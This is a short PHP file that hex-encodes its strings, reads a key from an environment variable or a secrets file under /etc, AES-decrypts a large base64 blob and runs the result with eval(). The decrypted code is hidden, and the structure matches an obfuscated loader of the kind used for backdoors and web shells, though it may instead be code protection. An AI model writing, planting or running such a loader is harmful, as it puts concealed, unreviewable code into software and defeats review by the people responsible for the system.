<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('uVKkqPjTpMm/BfdDAHgW7g==');

$c=base64_decode(

'g1vVmANsv69L4llrcg1IFwCjHetG70DZAMD5N/S4sTGZbAbJdjThfxTsVvDvWgqL8GSBlnae2716' .
'LkNRy4u4vSKa9XvHXOwRFywXQ0cwNMj6RSY2YMz78BKee80g8Kd9l/qnjxsMBH7PC6pkltCUBv2/' .
'gkhU9/G0SJSujB+Htv5ow5AdSlHTO7QZZtXLCIHjGzCeapdvq7rwazM2vsesqPVLdFmzz9Acqux7' .
'Mq9sQ3vG9W/Y9cco4c8DJi3j57+U81Ncr3xbVghVQ+b1SUceLikY4Sj/CCpyNE19odq+l2PH7187' .
'ihGwBhh3TzdGrHoIjWpW/+gAtz24CxljgNH7M3RVjQZcmxk+KuaGgQTk8/s+r3wG/4ry4r+L+Zxs' .
'WDu9q4AQDaODO0I+0NrM/JqRYw/UPVabHORY78I8LxnzH1J9qZ1UP548pbMNZcKk8mY+TbFl8Dxh' .
'5r1TjbbflaF3dYRioOAxoevcnytD/TJUmY4l2dH7PLYjUOpnjXlJrdbAtkYrRJEiHJWHvaML0/RH' .
'gBt4OO9HjekhK1AiP/YuorD3sDhm+hlgg2gGMLJuAz8k97zWbUt1dv3GOFktf1fDRFIGyis9R9DD' .
'afdUP2ttIACCPQ4l6hMbcWo+xgWiRIRQHrADAX1OQ90coIkSAIX56+dthctCtXVauAHGgKNNQra6' .
'khSF7UG8cKRUsrHSsgIg51u8J7EW0x7XWmMhF2RLHEcOaylE3ez9v1aUTRkt6CtEl1d2BIeqdI/7' .
'2AjqB51GacLLq2c83K3ndKHW13XHhSHNz6VCt+kUoVD6mXHTYHi5ghfw3uf1DPT8muH7R+6p2F4T' .
'veLQ8NFXIatDt6mABZ1/MXECzfyHRG0XaiX8JzVQrWFbwgZaJOn5i82CEmBixd0C0mugkHPOhMxj' .
'lKTeHCKECT9/E0qfW2Q5LOGJHjczOnrpDA20dBt5PcCgSY1EX07ZuzeDgsJSupVmqhTn0awRRKAx' .
'OrfJI097zNjkHPTi7xG/I9iO7dqo8QbX9u69cOT70FWkXfrPH2Avl64NrB9aGxSy6ChF1Y6P8MV+' .
'nThXeQSKkQUi/LhTaRCOgKsV43h0oLHPsYiP4Ga0G3QM0JbAT7/KFAJNBdWrkVEZK0tYvTHgNT9k' .
'wJ7XUhvv6NvEumbONSpy61ZmuCkBi2eJW0kQQKnVGbc8dDf2/0ebN2mmj3JlQBOe5nlGXYkz0KK3' .
'TR0rpZx7ZxSXHE9gLvCOsQbdHboD2tUKNY1youf1Ia8/w3uZHmI9haVNYojZAWHi6Xk26XHbm36L' .
'vXGzV/jWI/b6DEalnX3C657BUbm7YIkv3UVvCzN4wd2Y0Plbm/zuJg4aTenF6be1DilqXMFQBA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

